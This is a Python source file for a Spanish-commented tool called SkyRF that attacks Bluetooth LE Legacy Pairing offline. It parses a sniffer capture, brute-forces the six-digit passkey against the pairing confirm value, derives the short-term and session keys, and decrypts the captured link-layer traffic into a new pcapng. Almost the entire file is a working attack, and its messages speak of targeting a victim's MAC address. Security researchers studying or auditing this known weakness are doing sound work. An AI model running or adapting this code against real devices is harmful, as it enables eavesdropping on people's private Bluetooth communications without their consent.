#!/usr/bin/env python3
"""SkyRF — ble_legacy.py
Crackeo offline de BLE LE Legacy Pairing (estilo crackle, puro Python).

Pipeline completo sobre un pcap/pcapng del CatSniffer (Sniffle,
DLT_BLUETOOTH_LE_LL_WITH_PHDR):

    Pairing Request/Response  ──┐
    Pairing Confirm/Random    ─┼─► brute-force TK (passkey 000000-999999,
    CONNECT_IND (addr+types)  ─┘    ~20 bits de entropía) verificando c1()
    ──► STK = s1(TK, RAND_R, RAND_I)
    ──► LL_ENC_REQ/RSP  ──► SK = e(STK, SKD), IV = IVm||IVs
    ──► descifrado AES-CCM de los data PDUs (MIC verificado)

Cripto implementada desde la especificación oficial y verificada contra
sus vectores de prueba:
  * c1 / s1 — Bluetooth Core Spec, Vol 3 Part H §2.2.1-2.2.4
  * CCM LL  — Vol 6 Part E §2 (nonce 13B, M=4, L=2, B0=0x49, B1 AAD=1B)

Captura recomendada (catnip v3.3.x — sniff ble solo sale por Wireshark):
    tshark -i sniffle -w ble_pairing.pcapng     # durante el emparejamiento
    python -m skyrf.playbooks.ble_legacy ble_pairing.pcapng -o dec.pcapng

by Cinn4mor0ll
"""

import argparse
import json
import struct
import sys
import time
from dataclasses import dataclass, field

from Crypto.Cipher import AES

# ----------------------------------------------------------------------------
# Cripto LE legacy — convenio: todos los valores en formato "valor" de la spec
# (big-endian, MSB primero). La conversión desde el aire (LE) se hace al parsear.
# ----------------------------------------------------------------------------

def _e(key: bytes, block: bytes) -> bytes:
    """Security function e — AES-128 ECB, Vol 3 Part H §2.2.1."""
    return AES.new(key, AES.MODE_ECB).encrypt(block)


def _xor(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def c1(k: bytes, r: bytes, preq: bytes, pres: bytes,
       iat: int, rat: int, ia: bytes, ra: bytes) -> bytes:
    """c1(k,r,preq,pres,iat,rat,ia,ra) = e(k, e(k, r^p1) ^ p2)  [§2.2.3]"""
    p1 = pres + preq + bytes([rat & 1]) + bytes([iat & 1])
    p2 = bytes(4) + ia + ra
    return _e(k, _xor(_e(k, _xor(r, p1)), p2))


def s1(k: bytes, r1: bytes, r2: bytes) -> bytes:
    """s1(k, r1, r2) = e(k, r1' || r2'), r' = 64 LSB de cada rand  [§2.2.4]
    STK = s1(TK, LP_RAND_R, LP_RAND_I)  (¡responder primero!)"""
    return _e(k, r1[8:16] + r2[8:16])


def selftest_crypto() -> bool:
    """Vectores oficiales de la Core Spec (Vol 3 Part H §2.2.3 / §2.2.4)."""
    out = c1(bytes(16),
             bytes.fromhex("5783D52156AD6F0E6388274EC6702EE0"),
             bytes.fromhex("07071000000101"),
             bytes.fromhex("05000800000302"),
             1, 0,
             bytes.fromhex("A1A2A3A4A5A6"),
             bytes.fromhex("B1B2B3B4B5B6"))
    ok1 = out == bytes.fromhex("1E1E3FEF878988EAD2A74DC5BEF13B86")
    out2 = s1(bytes(16),
              bytes.fromhex("000F0E0D0C0B0A091122334455667788"),
              bytes.fromhex("010203040506070899AABBCCDDEEFF00"))
    ok2 = out2 == bytes.fromhex("9A1FE1F0E8B0F49B5B4216AE796DA062")
    return ok1 and ok2


# ----------------------------------------------------------------------------
# AES-CCM del Link Layer — RFC 3610 con M=4, L=2  (Vol 6 Part E §2)
# ----------------------------------------------------------------------------

def ll_nonce(packet_counter: int, direction: int, iv: bytes) -> bytes:
    """Nonce de 13 octetos: packetCounter(39b) | directionBit | IV(8B).
    iv en orden de aire tal como llega (LSB del valor IV primero)."""
    n = bytearray(13)
    n[0] = packet_counter & 0xFF
    n[1] = (packet_counter >> 8) & 0xFF
    n[2] = (packet_counter >> 16) & 0xFF
    n[3] = (packet_counter >> 24) & 0xFF
    n[4] = ((packet_counter >> 32) & 0x7F) | (0x80 if direction else 0)
    n[5:13] = iv
    return bytes(n)


def ll_ccm_decrypt(key: bytes, nonce: bytes, header_byte: int,
                   payload_ct: bytes, mic_ct: bytes):
    """Descifra un data PDU cifrado. header_byte = byte0 del PDU (LLID|NESN|SN|MD).
    Devuelve (plaintext, mic_ok). CCM: cifrado CTR + CBC-MAC sobre el *plaintext*."""
    aad = bytes([header_byte & 0xE3])           # NESN/SN/MD enmascarados (Tabla 2.3)
    plen = len(payload_ct)
    b0 = bytes([0x49]) + nonce + struct.pack(">H", plen)
    b1 = b"\x00\x01" + aad + bytes(13)          # AAD_Length=1 | AAD | padding

    cipher = AES.new(key, AES.MODE_ECB)

    def ctr_block(i: int) -> bytes:             # A_i = 0x01 | nonce | i(BE 2B)
        return cipher.encrypt(bytes([0x01]) + nonce + struct.pack(">H", i))

    # 1) CTR: descifrar payload
    pt = bytearray()
    for i in range(0, plen, 16):
        ks = ctr_block(i // 16 + 1)             # A1 cifra los primeros 16B
        chunk = payload_ct[i:i + 16]
        pt += bytes(a ^ b for a, b in zip(chunk, ks))
    pt = bytes(pt)

    # 2) CBC-MAC sobre B0 | B1 | plaintext (bloques de 16B, cero-padding)
    x = cipher.encrypt(b0)
    x = cipher.encrypt(_xor(x, b1))
    for i in range(0, plen, 16):
        blk = pt[i:i + 16]
        blk = blk + bytes(16 - len(blk))
        x = cipher.encrypt(_xor(x, blk))

    # 3) MIC transmitido = T XOR S0  (A0 cifra el MIC)
    mic_plain = bytes(a ^ b for a, b in zip(mic_ct, ctr_block(0)[:4]))
    return pt, mic_plain == x[:4]


# ----------------------------------------------------------------------------
# Lectura de pcap / pcapng (manual — sin dependencias de scapy)
# ----------------------------------------------------------------------------

LINKTYPE_BLE_LL = 251
LINKTYPE_BLE_LL_PHDR = 256


@dataclass
class RawPacket:
    ts: float
    data: bytes


def _read_pcapng(buf: bytes) -> list:
    pkts, offset, endian, linktypes = [], 0, "<", {}
    if_id = 0
    while offset + 12 <= len(buf):
        btype, blen = struct.unpack_from(endian + "II", buf, offset)
        if blen < 12 or offset + blen > len(buf):
            break
        body = buf[offset + 8:offset + blen - 4]
        if btype == 0x0A0D0D0A and len(body) >= 4:      # Section Header
            bom = struct.unpack_from("<I", body, 0)[0]
            endian = "<" if bom == 0x1A2B3C4D else ">"
        elif btype == 0x00000001 and len(body) >= 8:    # Interface Description
            lt = struct.unpack_from(endian + "H", body, 0)[0]
            linktypes[if_id] = lt
            if_id += 1
        elif btype == 0x00000006 and len(body) >= 20:   # Enhanced Packet
            iid, tsh, tsl, caplen = struct.unpack_from(endian + "IIII", body, 0)
            ts = ((tsh << 32) | tsl) / 1_000_000.0
            if linktypes.get(iid) in (LINKTYPE_BLE_LL, LINKTYPE_BLE_LL_PHDR, None):
                pkts.append(RawPacket(ts, body[20:20 + caplen]))
        elif btype == 0x00000003 and len(body) >= 4:    # Simple Packet
            plen = struct.unpack_from(endian + "I", body, 0)[0]
            pkts.append(RawPacket(0.0, body[4:4 + plen]))
        offset += blen
    return pkts


def _read_pcap(buf: bytes) -> list:
    magic = buf[:4]
    if magic in (b"\xa1\xb2\xc3\xd4", b"\xa1\xb2\x3c\x4d"):
        endian = ">"
    else:
        endian = "<"
    pkts, offset = [], 24
    while offset + 16 <= len(buf):
        ts_sec, ts_usec, incl, _orig = struct.unpack_from(endian + "IIII", buf, offset)
        offset += 16
        if offset + incl > len(buf):
            break
        pkts.append(RawPacket(ts_sec + ts_usec / 1e6, buf[offset:offset + incl]))
        offset += incl
    return pkts


def read_capture(path: str) -> list:
    buf = open(path, "rb").read()
    if buf[:4] == b"\x0a\x0d\x0d\x0a":
        return _read_pcapng(buf)
    if buf[:4] in (b"\xd4\xc3\xb2\xa1", b"\xa1\xb2\xc3\xd4",
                   b"\x4d\x3c\xb2\xa1", b"\xa1\xb2\x3c\x4d"):
        return _read_pcap(buf)
    raise ValueError("Formato no reconocido (no es pcap ni pcapng)")


# ----------------------------------------------------------------------------
# Parser BLE Link Layer
# ----------------------------------------------------------------------------

BLE_ADV_AA = 0x8E89BED6

SMP_NAMES = {0x01: "Pairing Request", 0x02: "Pairing Response",
             0x03: "Pairing Confirm", 0x04: "Pairing Random",
             0x05: "Pairing Failed", 0x06: "Pairing Public Key",
             0x0B: "Pairing DHKey Check"}

LL_CTRL = {0x03: "LL_ENC_REQ", 0x04: "LL_ENC_RSP", 0x05: "LL_START_ENC_REQ",
           0x06: "LL_START_ENC_RSP", 0x07: "LL_UNKNOWN_RSP",
           0x0C: "LL_PAUSE_ENC_REQ", 0x0D: "LL_PAUSE_ENC_RSP"}

ATT_NAMES = {0x01: "Error Rsp", 0x02: "MTU Req", 0x03: "MTU Rsp",
             0x08: "Read By Type Req", 0x09: "Read By Type Rsp",
             0x0A: "Read Req", 0x0B: "Read Rsp", 0x10: "Read By Group Req",
             0x11: "Read By Group Rsp", 0x12: "Write Req", 0x13: "Write Rsp",
             0x1B: "Handle Value Ntf", 0x1D: "Handle Value Ind",
             0x52: "Write Cmd", 0xD2: "Signed Write Cmd"}


@dataclass
class PairingMaterial:
    preq: bytes = b""            # 7B, orden de aire
    pres: bytes = b""
    confirm_i: bytes = b""       # 16B aire
    confirm_r: bytes = b""
    rand_i: bytes = b""
    rand_r: bytes = b""
    iat: int = -1                # address type initiator (0=public 1=random)
    rat: int = -1
    ia: bytes = b""              # 6B aire (LSB primero)
    ra: bytes = b""

    def ready_to_crack(self) -> bool:
        return bool(self.preq and self.pres and self.confirm_i and self.rand_i
                    and self.ia and self.ra and self.iat >= 0 and self.rat >= 0)


@dataclass
class EncContext:
    skdm: bytes = b""
    skds: bytes = b""
    ivm: bytes = b""
    ivs: bytes = b""
    rand: bytes = b""
    ediv: int = 0
    started: bool = False


@dataclass
class EncryptedPDU:
    direction: int               # 1 = central->peripheral, 0 = peripheral->central
    header0: int
    payload: bytes               # ciphertext (sin MIC)
    mic: bytes


@dataclass
class Capture:
    pairing: PairingMaterial = field(default_factory=PairingMaterial)
    enc: EncContext = field(default_factory=EncContext)
    encrypted: list = field(default_factory=list)
    smp_log: list = field(default_factory=list)
    n_pdus: int = 0
    secure_connections: bool = False


def _strip_phdr(data: bytes) -> bytes:
    """Sniffle pcap = PHDR(10B) + paquete LL crudo (AA + PDU + CRC)."""
    if len(data) >= 14:
        aa = struct.unpack_from("<I", data, 10)[0]
        # AA plausible: advertising o cualquier valor; mejor comprobar longitud
        if len(data) - 10 >= 7:
            return data[10:]
    return data


def parse_capture(pkts: list, verbose: bool = True) -> Capture:
    cap = Capture()
    enc_pending = False            # vimos ENC_REQ/RSP, esperando START_ENC_RSP
    _last_sn = {}                  # SN por dirección para filtrar retransmisiones

    def vprint(*a):
        if verbose:
            print(*a)

    for rp in pkts:
        raw = _strip_phdr(rp.data)
        if len(raw) < 4 + 2:
            continue
        aa = struct.unpack_from("<I", raw, 0)[0]
        pdu = raw[4:]
        cap.n_pdus += 1

        # --- canal de advertising ---
        if aa == BLE_ADV_AA:
            ptype = pdu[0] & 0x0F
            if ptype == 0x05 and len(pdu) >= 2 + 34:     # CONNECT_IND
                txadd = (pdu[0] >> 6) & 1
                rxadd = (pdu[0] >> 7) & 1
                plen = pdu[1] & 0x3F
                payload = pdu[2:2 + plen]
                if len(payload) >= 12:
                    cap.pairing.ia = payload[0:6]        # InitA (aire, LSB 1º)
                    cap.pairing.ra = payload[6:12]       # AdvA
                    cap.pairing.iat = txadd
                    cap.pairing.rat = rxadd
                    vprint(f"[+] CONNECT_IND  init={_fmt_addr(payload[0:6])} "
                           f"(type {txadd})  adv={_fmt_addr(payload[6:12])} (type {rxadd})")
            continue

        # --- canal de datos ---
        if len(pdu) < 2:
            continue
        h0, h1 = pdu[0], pdu[1]
        llid = h0 & 0x03
        plen = h1 & 0x1F
        payload = pdu[2:2 + plen]
        if len(payload) < plen:
            continue

        if enc_pending or cap.enc.started:
            if llid == 0x03:                            # LL control nunca cifrado
                if payload and payload[0] == 0x06:      # LL_START_ENC_RSP
                    cap.enc.started = True
                    vprint("[!] LL_START_ENC_RSP — enlace cifrado a partir de aquí")
            elif plen >= 5:                             # payload + MIC de 4B
                direction = _guess_direction(rp, raw)
                sn = (h0 >> 3) & 1
                # retransmisión = mismo SN que el anterior de esa dirección:
                # no incrementa el packetCounter (Vol 6 Part E §2.1)
                if sn != _last_sn.get(direction):
                    cap.encrypted.append(EncryptedPDU(
                        direction, h0, payload[:-4], payload[-4:]))
                    _last_sn[direction] = sn
            continue

        if llid == 0x03:                                # LL control
            if not payload:
                continue
            op = payload[0]
            name = LL_CTRL.get(op, f"LL_CTRL_0x{op:02X}")
            if op == 0x03 and len(payload) >= 23:       # LL_ENC_REQ
                cap.enc.rand = payload[1:9]
                cap.enc.ediv = struct.unpack_from("<H", payload, 9)[0]
                cap.enc.skdm = payload[11:19]
                cap.enc.ivm = payload[19:23]
                vprint(f"[+] LL_ENC_REQ  SKDm={cap.enc.skdm.hex()} IVm={cap.enc.ivm.hex()}")
            elif op == 0x04 and len(payload) >= 13:     # LL_ENC_RSP
                cap.enc.skds = payload[1:9]
                cap.enc.ivs = payload[9:13]
                vprint(f"[+] LL_ENC_RSP  SKDs={cap.enc.skds.hex()} IVs={cap.enc.ivs.hex()}")
            elif op == 0x05:                            # START_ENC_REQ
                enc_pending = True
                vprint("[+] LL_START_ENC_REQ — el cifrado está a punto de activarse")
            elif op == 0x06 and enc_pending:
                cap.enc.started = True
                vprint("[!] LL_START_ENC_RSP — enlace cifrado a partir de aquí")
            continue

        if llid == 0x02 and len(payload) >= 5:          # L2CAP start
            cid = struct.unpack_from("<H", payload, 2)[0]
            if cid == 0x0006:                           # SMP
                _parse_smp(cap, payload[4:], vprint)
            elif cid == 0x0005:                         # L2CAP signaling
                pass

    return cap


def _guess_direction(rp: RawPacket, raw: bytes) -> int:
    """Bit 0 de los flags del PHDR de Sniffle: 1 = peripheral->central.
    Devuelve 1 para central->peripheral (directionBit de la spec)."""
    data = rp.data
    if len(data) >= 12 and data is not raw:             # tenía PHDR
        flags = struct.unpack_from("<H", data, 8)[0]
        return 0 if (flags & 0x0001) else 1
    return 1


def _fmt_addr(air: bytes) -> str:
    return ":".join(f"{b:02X}" for b in reversed(air))


def _parse_smp(cap: Capture, smp: bytes, vprint) -> None:
    op = smp[0]
    name = SMP_NAMES.get(op, f"SMP_0x{op:02X}")
    p = cap.pairing
    if op == 0x01 and len(smp) >= 7:
        p.preq = smp[:7]
        sc = bool(smp[3] & 0x08)                        # AuthReq bit3 = SC
        cap.secure_connections = cap.secure_connections and sc or (sc and bool(p.pres))
        vprint(f"[+] {name}: IO=0x{smp[1]:02X} OOB=0x{smp[2]:02X} AuthReq=0x{smp[3]:02X}"
               f"{'  [Secure Connections!]' if sc else '  [LEGACY]'}")
    elif op == 0x02 and len(smp) >= 7:
        p.pres = smp[:7]
        sc = bool(smp[3] & 0x08)
        cap.secure_connections = bool(p.preq) and sc
        vprint(f"[+] {name}: IO=0x{smp[1]:02X} AuthReq=0x{smp[3]:02X}"
               f"{'  [Secure Connections!]' if sc else '  [LEGACY]'}")
    elif op == 0x03 and len(smp) >= 17:
        if not p.confirm_i:
            p.confirm_i = smp[1:17]
            vprint(f"[+] Pairing Confirm (init): {p.confirm_i.hex()}")
        else:
            p.confirm_r = smp[1:17]
            vprint(f"[+] Pairing Confirm (resp): {p.confirm_r.hex()}")
    elif op == 0x04 and len(smp) >= 17:
        if not p.rand_i:
            p.rand_i = smp[1:17]
            vprint(f"[+] Pairing Random (init): {p.rand_i.hex()}")
        else:
            p.rand_r = smp[1:17]
            vprint(f"[+] Pairing Random (resp): {p.rand_r.hex()}")
    elif op == 0x06:
        cap.secure_connections = True
        vprint(f"[!] {name} — esto es LE Secure Connections, NO crackeable por fuerza bruta")
    cap.smp_log.append(name)


# ----------------------------------------------------------------------------
# Fuerza bruta del TK
# ----------------------------------------------------------------------------

def crack_tk(p: PairingMaterial, max_passkey: int = 999_999,
             progress_every: int = 100_000):
    """Devuelve (passkey, tk_be) o (None, None)."""
    # a formato valor (BE)
    preq, pres = p.preq[::-1], p.pres[::-1]
    ia, ra = p.ia[::-1], p.ra[::-1]
    rand_i = p.rand_i[::-1]
    target = p.confirm_i[::-1]

    t0 = time.time()
    for pw in range(max_passkey + 1):
        tk = pw.to_bytes(16, "big")
        if c1(tk, rand_i, preq, pres, p.iat, p.rat, ia, ra) == target:
            dt = time.time() - t0
            print(f"\n[★] TK ENCONTRADO: passkey {pw:06d}  ({dt:.1f}s, "
                  f"{pw / max(dt, 1e-9):,.0f} keys/s)")
            # verificación cruzada con el confirm del responder si existe
            if p.confirm_r and p.rand_r:
                chk = c1(tk, p.rand_r[::-1], preq, pres, p.iat, p.rat, ia, ra)
                if chk == p.confirm_r[::-1]:
                    print("[✓] Verificado también contra el confirm del responder")
            return pw, tk
        if progress_every and pw and pw % progress_every == 0:
            dt = time.time() - t0
            print(f"    …{pw:,} passkeys probados ({pw / max(dt, 1e-9):,.0f} keys/s)",
                  flush=True)
    return None, None


# ----------------------------------------------------------------------------
# Claves de sesión y descifrado
# ----------------------------------------------------------------------------

def session_key_candidates(stk_be: bytes, enc: EncContext):
    """Genera (descripción, SK, IV) candidatos. El MIC decide cuál vale."""
    out = []
    if enc.skds and enc.skdm:
        # crackle: SKD en memoria = SKDs||SKDm; al AES va el bloque invertido
        out.append(("SKD=rev(SKDs||SKDm)", _e(stk_be, (enc.skds + enc.skdm)[::-1])))
        out.append(("SKD=rev(SKDm||SKDs)", _e(stk_be, (enc.skdm + enc.skds)[::-1])))
    ivs = []
    if enc.ivm and enc.ivs:
        ivs.append(("IV=IVs||IVm", enc.ivs + enc.ivm))
        ivs.append(("IV=IVm||IVs", enc.ivm + enc.ivs))
    return [(f"{sd} / {vd}", sk, iv) for (sd, sk) in out for (vd, iv) in ivs]


def decrypt_all(cap: Capture, stk_be: bytes):
    """Prueba las combinaciones SK/IV contra el primer PDU cifrado (MIC) y
    descifra el resto con la combinación ganadora."""
    if not cap.encrypted:
        print("[i] No hay PDUs cifrados en la captura")
        return None, []
    cands = session_key_candidates(stk_be, cap.enc)
    if not cands:
        print("[!] Falta LL_ENC_REQ/RSP en la captura — sin SKD/IV no hay descifrado")
        return None, []

    winner = None
    for desc, sk, iv in cands:
        for flip in (0, 1):                             # por si los flags de dirección vienen invertidos
            c = {0: 0, 1: 0}
            for ep in cap.encrypted[:6]:                # ventana de prueba
                d = ep.direction ^ flip
                nonce = ll_nonce(c[d], d, iv)
                _pt, ok = ll_ccm_decrypt(sk, nonce, ep.header0, ep.payload, ep.mic)
                c[d] += 1
                if ok:
                    winner = (desc + (" [dir flip]" if flip else ""), sk, iv, flip)
                    break
            if winner:
                break
        if winner:
            break
    if not winner:
        print("[!] Ninguna combinación SK/IV superó el MIC — captura con "
              "retransmisiones o bytes en orden inusual")
        return None, []

    desc, sk, iv, flip = winner
    print(f"[✓] MIC verificado — combinación ganadora: {desc}")
    print(f"    SK = {sk.hex()}")
    print(f"    IV = {iv.hex()}")

    counters = {0: 0, 1: 0}
    plain = []
    for ep in cap.encrypted:
        d = ep.direction ^ flip
        nonce = ll_nonce(counters[d], d, iv)
        pt, ok = ll_ccm_decrypt(sk, nonce, ep.header0, ep.payload, ep.mic)
        counters[d] += 1
        plain.append((ep, pt, ok))
    return winner, plain


def describe_plaintext(pt: bytes) -> str:
    """Decodificación mínima L2CAP/ATT del payload descifrado."""
    if len(pt) >= 4:
        ln, cid = struct.unpack_from("<HH", pt, 0)
        if cid == 0x0004 and ln + 4 <= len(pt) + 1:     # ATT
            op = pt[4]
            return f"ATT {ATT_NAMES.get(op, f'op 0x{op:02X}')} [{pt[4:].hex()}]"
        if cid == 0x0006:
            return f"SMP {SMP_NAMES.get(pt[4], hex(pt[4])) if len(pt) > 4 else ''}"
        return f"L2CAP cid=0x{cid:04X} [{pt[4:4 + ln].hex()}]"
    return f"[{pt.hex()}]"


# ----------------------------------------------------------------------------
# Exportar pcapng descifrado (flag PHDR 0x0400 = "decrypted" para Wireshark)
# ----------------------------------------------------------------------------

def write_decrypted_pcapng(src_pkts: list, cap: Capture, plain: list, out_path: str):
    """Escribe un pcapng nuevo con los PDUs cifrados sustituidos por su
    plaintext (sin MIC) y el flag de 'decrypted' activado."""
    blocks = []
    shb = struct.pack("<II I H H q I",
                      0x0A0D0D0A, 28, 0x1A2B3C4D, 1, 0, -1, 28)
    blocks.append(shb)
    idb = struct.pack("<II H H I I", 1, 20, LINKTYPE_BLE_LL_PHDR, 0, 65535, 20)
    blocks.append(idb)

    enc_queue = list(cap.encrypted)
    ei = 0
    pt_map = {id(ep): (pt, ok) for ep, pt, ok in (plain or [])}

    for rp in src_pkts:
        raw = _strip_phdr(rp.data)
        phdr = rp.data[:10] if len(rp.data) >= 10 and rp.data is not raw else None
        new_data = rp.data
        if phdr and len(raw) >= 6:
            aa = struct.unpack_from("<I", raw, 0)[0]
            if aa != BLE_ADV_AA and ei < len(cap.encrypted):
                ep = cap.encrypted[ei]
                # reconstruir: header(2) + plaintext (sin MIC)
                got = pt_map.get(id(ep))
                if got:
                    pt, ok = got
                    h1 = (raw[5] & 0xE0) | (len(pt) & 0x1F)
                    pdu = bytes([ep.header0, h1]) + pt
                    flags = struct.unpack_from("<H", phdr, 8)[0] | 0x0400
                    new_phdr = phdr[:8] + struct.pack("<H", flags)
                    new_data = new_phdr + raw[:4] + pdu
                    ei += 1
        pad = (4 - len(new_data) % 4) % 4
        tsh, tsl = divmod(int(rp.ts * 1_000_000), 1 << 32)
        body = struct.pack("<IIIII", 0, tsh, tsl, len(new_data), len(new_data)) + new_data + bytes(pad)
        blen = 12 + len(body)
        blocks.append(struct.pack("<II", 0x00000006, blen) + body + struct.pack("<I", blen))

    with open(out_path, "wb") as f:
        f.write(b"".join(blocks))
    print(f"[✓] Captura descifrada escrita en {out_path} (flag 'decrypted' marcado)")


# ----------------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------------

BANNER = r"""
  ██████╗ ██╗     ███████╗    ██╗     ███████╗ ██████╗  █████╗  ██████╗██╗   ██╗
  ██╔══██╗██║     ██╔════╝    ██║     ██╔════╝██╔════╝ ██╔══██╗██╔════╝╚██╗ ██╔╝
  ██████╔╝██║     █████╗      ██║     █████╗  ██║  ███╗███████║██║      ╚████╔╝
  ██╔══██╗██║     ██╔══╝      ██║     ██╔══╝  ██║   ██║██╔══██║██║       ╚██╔╝
  ██████╔╝███████╗███████╗    ███████╗███████╗╚██████╔╝██║  ██║╚██████╗   ██║
  ╚═════╝ ╚══════╝╚══════╝    ╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝   ╚═╝
   SkyRF · crackeo offline de LE Legacy Pairing · by Cinn4mor0ll
"""


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        prog="skyrf.playbooks.ble_legacy",
        description="Crackea el TK de BLE LE Legacy Pairing desde un pcap y "
                    "descifra la conexión (estilo crackle).")
    ap.add_argument("pcap", nargs="?", help="captura pcap/pcapng del Sniffle (tshark -i sniffle -w ...)")
    ap.add_argument("-o", "--out", help="pcapng de salida con los PDUs descifrados")
    ap.add_argument("--json", action="store_true", help="resumen en JSON al final")
    ap.add_argument("--no-decrypt", action="store_true",
                    help="solo crackear TK/STK, no descifrar tráfico")
    ap.add_argument("--selftest", action="store_true",
                    help="verificar la cripto contra los vectores oficiales y salir")
    args = ap.parse_args(argv)

    if args.selftest:
        ok = selftest_crypto()
        print("[✓] c1/s1 verificados contra la spec oficial" if ok
              else "[✗] FALLO en los vectores de la spec")
        return 0 if ok else 1

    if not args.pcap:
        ap.error("falta la captura pcap/pcapng")

    print(BANNER)
    pkts = read_capture(args.pcap)
    print(f"[*] {len(pkts)} paquetes leídos de {args.pcap}")
    cap = parse_capture(pkts)
    print(f"[*] {cap.n_pdus} PDUs LL parseados · {len(cap.smp_log)} mensajes SMP · "
          f"{len(cap.encrypted)} PDUs cifrados")

    p = cap.pairing
    if not p.ready_to_crack():
        faltan = [n for n, v in (("Pairing Request", p.preq), ("Pairing Response", p.pres),
                                 ("Confirm", p.confirm_i), ("Random", p.rand_i),
                                 ("CONNECT_IND (direcciones)", p.ia)) if not v]
        print(f"\n[✗] Captura incompleta para el ataque — faltan: {', '.join(faltan)}")
        if not p.ia:
            print("    ⚠ No hay NINGÚN CONNECT_IND: esta captura es SOLO advertising.")
            print("    → El pairing ocurre DENTRO de la conexión: captura CON el filtro MAC")
            print("      de la víctima (Sniffle sigue la conexión por los canales de datos)")
            print("      y empareja DESPUÉS de iniciar la captura, nunca antes.")
            print("      En el dashboard: paso 02 con la MAC de la víctima escrita.")
        print("    Manual: tshark -i sniffle -o \"extcap.sniffle.serport:/dev/ttyACM0\" \\")
        print("            -o \"extcap.sniffle.mac:AA:BB:CC:DD:EE:FF\" -w ble.pcapng")
        return 2
    if cap.secure_connections:
        print("\n[✗] La captura usa LE Secure Connections (ECDH) — no vulnerable a"
              " fuerza bruta offline. Busca dispositivos legacy (sin bit SC en AuthReq).")
        return 3

    print("\n[»] Fase 1 — fuerza bruta del TK (passkey 000000–999999, ~20 bits)…")
    pw, tk = crack_tk(p)
    if tk is None:
        print("\n[✗] TK no encontrado en 000000–999999 (¿OOB? ¿Secure Connections?)")
        return 4

    stk = s1(tk, p.rand_r[::-1], p.rand_i[::-1])
    print(f"[★] STK = {stk.hex()}")
    print("    → mételo en Wireshark: Preferences › Protocols › BTLE › Key: "
          "el enlace se descifra entero")

    result = {"passkey": f"{pw:06d}", "tk": tk.hex(), "stk": stk.hex(),
              "initiator": _fmt_addr(p.ia), "responder": _fmt_addr(p.ra),
              "encrypted_pdus": len(cap.encrypted)}

    if not args.no_decrypt and cap.enc.started:
        print("\n[»] Fase 2 — descifrado de la conexión (AES-CCM LL)…")
        winner, plain = decrypt_all(cap, stk)
        if winner:
            n_ok = sum(1 for _e_, _p, ok in plain if ok)
            print(f"[✓] {n_ok}/{len(plain)} PDUs descifrados con MIC válido\n")
            for i, (ep, pt, ok) in enumerate(plain[:40]):
                d = "C→P" if ep.direction else "P→C"
                mark = "✓" if ok else "✗ MIC"
                print(f"  [{i:03d}] {d} {mark}  {describe_plaintext(pt)}")
            if len(plain) > 40:
                print(f"  … y {len(plain) - 40} más")
            result["decrypted_ok"] = n_ok
            if args.out:
                write_decrypted_pcapng(pkts, cap, plain, args.out)
    if args.json:
        print("\n" + json.dumps(result, indent=2))
    print("\n[★] Ataque completado — la gatita aprueba. SkyRF · by Cinn4mor0ll")
    return 0


if __name__ == "__main__":
    sys.exit(main())
